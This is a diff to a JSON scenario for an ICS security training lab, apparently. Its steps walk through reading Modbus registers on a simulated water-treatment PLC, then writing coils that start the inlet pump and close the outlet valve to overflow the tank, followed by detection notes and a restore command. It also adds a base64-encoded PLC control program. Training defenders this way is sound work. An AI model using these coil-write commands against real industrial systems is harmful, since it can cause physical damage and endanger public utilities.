@@ -48,21 +48,21 @@
         "id": "step-05-modbus-read",
         "title": "Step 5 — Read Modbus Registers",
         "body": "Before writing any registers, **read the current state**. This is essential in real ICS security testing — you need to know baseline values before making changes, so you can restore them afterward.\n\nUse `pymodbus` to read coil registers from the PLC at `{{plc-1.ip}}`. Coil addresses:\n- **Coil 0** — Inlet pump (0=off, 1=on)\n- **Coil 1** — Outlet valve (0=closed, 1=open)\n- **Coil 2** — Emergency shutoff (0=normal, 1=trip)\n\nAlso read holding registers 0–4 to see the current tank level and flow rates.\n\nPaste into **⚔ Kali Terminal** (Ctrl+V).",
-        "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\ncoils = c.read_coils(0, 3, slave=1)\nregs = c.read_holding_registers(0, 5, slave=1)\nprint('Coils:', coils.bits[:3])\nprint('Tank level (m):', regs.registers[0]/100.0)\nprint('Inlet flow (L/min):', regs.registers[1])\nprint('Outlet flow (L/min):', regs.registers[2])\nc.close()\n\"",
+        "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\ncoils = c.read_coils(0, 3, device_id=1)\nregs = c.read_holding_registers(0, 5, device_id=1)\nprint('Coils:', coils.bits[:3])\nprint('Tank level (m):', regs.registers[0]/100.0)\nprint('Inlet flow (L/min):', regs.registers[1])\nprint('Outlet flow (L/min):', regs.registers[2])\nc.close()\n\"",
         "successCheck": "You should see Coils: [False, True, False] — pump off, valve open, no emergency trip. Tank level around 5.0 m (50% full). Inlet and outlet flows are balanced. This is the normal operating state."
       },
       {
         "id": "step-06-coil-write",
         "title": "Step 6 — Write Modbus Coils (The Attack)",
         "body": "Now execute the attack: **start the inlet pump** (Coil 0 → 1) and **close the outlet valve** (Coil 1 → 0). With water flowing in but not out, the tank will overflow.\n\nThis is the same technique used in the **2021 Oldsmar, Florida water treatment attack** — except the attacker in that incident used remote access software rather than direct Modbus. The underlying vulnerability is identical: unauthenticated Modbus TCP.\n\n**No authentication is required.** Modbus TCP has no built-in access control — any device on the network can write any register on any PLC. This is why network segmentation and defense-in-depth are critical.\n\nPaste into **⚔ Kali Terminal** (Ctrl+V).",
-        "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\n# Start inlet pump (coil 0 = True)\nc.write_coil(0, True, slave=1)\n# Close outlet valve (coil 1 = False)\nc.write_coil(1, False, slave=1)\nprint('Attack complete: pump ON, outlet valve CLOSED')\nprint('Tank will overflow. Check holding register 0 for rising level.')\nc.close()\n\"",
+        "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\n# Start inlet pump (coil 0 = True)\nc.write_coil(0, True, device_id=1)\n# Close outlet valve (coil 1 = False)\nc.write_coil(1, False, device_id=1)\nprint('Attack complete: pump ON, outlet valve CLOSED')\nprint('Tank will overflow. Check holding register 0 for rising level.')\nc.close()\n\"",
         "successCheck": "Command succeeds with no exception — Modbus TCP accepted the write with no authentication challenge. Switch to the Grafana monitor (toolbar → Monitor) and watch the tank level holding register rise continuously."
       },
       {
         "id": "step-07-observe",
         "title": "Step 7 — Observe the Effect",
         "body": "The attack is running. Now observe the physical consequence using the **Grafana monitoring dashboard**.\n\nOpen the monitor panel (toolbar → **Monitor**), then navigate to the **ICS Lab Overview** dashboard. Watch the **Tank Level** gauge rise past the 9.0 m overflow threshold. The **Inlet Flow** register will show positive flow; **Outlet Flow** will be zero.\n\nThis is exactly what a blue-team analyst would see in Suricata and Zeek alerts: unexpected Modbus Function Code 5 (Write Single Coil) writes from an external subnet to a PLC — a clear indicator of compromise.\n\n**To restore normal operations**, run the command below (paste it into **⚔ Kali Terminal** with Ctrl+V).",
-        "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\nc.write_coil(0, False, slave=1)\nc.write_coil(1, True, slave=1)\nprint('Restored: pump OFF, outlet valve OPEN')\nc.close()\n\"",
+        "command": "python3 -c \"\nfrom pymodbus.client import ModbusTcpClient\nc = ModbusTcpClient('{{plc-1.ip}}', port=502)\nc.connect()\nc.write_coil(0, False, device_id=1)\nc.write_coil(1, True, device_id=1)\nprint('Restored: pump OFF, outlet valve OPEN')\nc.close()\n\"",
         "successCheck": "Tank level should stop rising and begin dropping back toward 5.0 m. Grafana shows outlet flow resuming. You have successfully executed — and remediated — a Modbus coil write attack against a water treatment PLC."
       },
       {
@@ -141,13 +141,21 @@
         "id": "e-plc-switch",
         "source": "plc-1",
         "target": "switch-ot",
-        "data": { "protocol": "modbus-tcp", "label": "Modbus TCP :502" }
+        "data": {
+          "protocol": "modbus-tcp",
+          "label": "Modbus TCP :502",
+          "coilSource": { "nodeId": "plc-1", "coilIndex": 0 }
+        }
       },
       {
         "id": "e-process-switch",
         "source": "process-unit-1",
         "target": "switch-ot",
-        "data": { "protocol": "modbus-tcp", "label": "Modbus TCP :502" }
+        "data": {
+          "protocol": "modbus-tcp",
+          "label": "Modbus TCP :502",
+          "coilSource": { "nodeId": "plc-1", "coilIndex": 1 }
+        }
       },
       {
         "id": "e-switch-firewall",
@@ -250,6 +258,18 @@
               "2": 120
             }
           }
+        },
+        "plcProgram": {
+          "language": "st",
+          "source": "UFJPR1JBTSBwdW1wX2NvbnRyb2wKICBWQVIKICAgICgqIENvaWwgMCAtIElubGV0IHB1bXA6IEZBTFNFPU9GRiwgVFJVRT1PTi4gTW9kYnVzIEZDMDUvRkMxNSB3cml0YWJsZS4gKikKICAgIHB1bXBfcnVuICAgQVQgJVFYMC4wIDogQk9PTCA6PSBGQUxTRTsKICAgICgqIENvaWwgMSAtIE91dGxldCB2YWx2ZTogRkFMU0U9Q0xPU0VELCBUUlVFPU9QRU4uIEluaXRpYWwgc3RhdGU6IG9wZW4uICopCiAgICB2YWx2ZV9vcGVuIEFUICVRWDAuMSA6IEJPT0wgOj0gVFJVRTsKICAgICgqIENvaWwgMiAtIEVtZXJnZW5jeSBzdG9wOiBGQUxTRT1ub3JtYWwsIFRSVUU9dHJpcHBlZC4gKikKICAgIGVtcmdfc3RvcCAgQVQgJVFYMC4yIDogQk9PTCA6PSBGQUxTRTsKICAgICgqIEhvbGRpbmcgcmVnaXN0ZXIgMCAtIFRhbmsgbGV2ZWwgaW4gY20gKDUwMD01LjAwbSkuICopCiAgICB0YW5rX2xldmVsIEFUICVNVzAgICA6IElOVCAgOj0gNTAwOwogICAgKCogSG9sZGluZyByZWdpc3RlciAxIC0gSW5sZXQgZmxvdyByYXRlIEwvbWluLiAqKQogICAgaW5sZXRfZmxvdyBBVCAlTVcxICAgOiBJTlQgIDo9IDA7CiAgICAoKiBIb2xkaW5nIHJlZ2lzdGVyIDIgLSBPdXRsZXQgZmxvdyByYXRlIEwvbWluLiAqKQogICAgb3V0bGV0X2Zsb3cgQVQgJU1XMiAgOiBJTlQgIDo9IDA7CiAgRU5EX1ZBUgoKICBJRiBwdW1wX3J1biBBTkQgTk9UIGVtcmdfc3RvcCBUSEVOCiAgICBpbmxldF9mbG93IDo9IDEyMDsKICBFTFNFCiAgICBpbmxldF9mbG93IDo9IDA7CiAgRU5EX0lGOwoKICBJRiB2YWx2ZV9vcGVuIEFORCBOT1QgZW1yZ19zdG9wIFRIRU4KICAgIG91dGxldF9mbG93IDo9IDEyMDsKICBFTFNFCiAgICBvdXRsZXRfZmxvdyA6PSAwOwogIEVORF9JRjsKCkVORF9QUk9HUkFNCgpDT05GSUdVUkFUSU9OIENvbmZpZzAKICBSRVNPVVJDRSBSZXMwIE9OIFBMQwogICAgVEFTSyB0YXNrMChJTlRFUlZBTCA6PSBUIzEwMG1zLCBQUklPUklUWSA6PSAwKTsKICAgIFBST0dSQU0gaW5zdDAgV0lUSCB0YXNrMCA6IHB1bXBfY29udHJvbDsKICBFTkRfUkVTT1VSQ0UKRU5EX0NPTkZJR1VSQVRJT04K",
+          "variables": [
+            { "name": "pump_run",    "type": "BOOL", "address": "%QX0.0", "protocol": "modbus-tcp", "protocolAddress": "0" },
+            { "name": "valve_open",  "type": "BOOL", "address": "%QX0.1", "protocol": "modbus-tcp", "protocolAddress": "1" },
+            { "name": "emrg_stop",   "type": "BOOL", "address": "%QX0.2", "protocol": "modbus-tcp", "protocolAddress": "2" },
+            { "name": "tank_level",  "type": "INT",  "address": "%MW0",   "protocol": "modbus-tcp", "protocolAddress": "40001" },
+            { "name": "inlet_flow",  "type": "INT",  "address": "%MW1",   "protocol": "modbus-tcp", "protocolAddress": "40002" },
+            { "name": "outlet_flow", "type": "INT",  "address": "%MW2",   "protocol": "modbus-tcp", "protocolAddress": "40003" }
+          ]
         }
       },
       "process-unit-1": {
